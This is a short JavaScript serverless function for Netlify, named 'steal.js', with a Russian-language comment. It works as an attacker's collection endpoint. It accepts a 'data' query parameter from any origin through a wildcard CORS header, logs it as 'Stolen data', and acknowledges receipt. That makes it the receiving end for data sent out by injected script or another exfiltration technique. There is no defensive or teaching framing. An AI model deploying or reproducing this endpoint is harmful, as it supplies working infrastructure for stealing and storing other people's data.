// functions/steal.js
exports.handler = async (event) => {
  const data = event.queryStringParameters.data;
  
  // Логирование в консоль Netlify
  console.log('Stolen data:', data);
  
  return {
    statusCode: 200,
    body: JSON.stringify({ received: true }),
    headers: { 'Access-Control-Allow-Origin': '*' }
  };
};
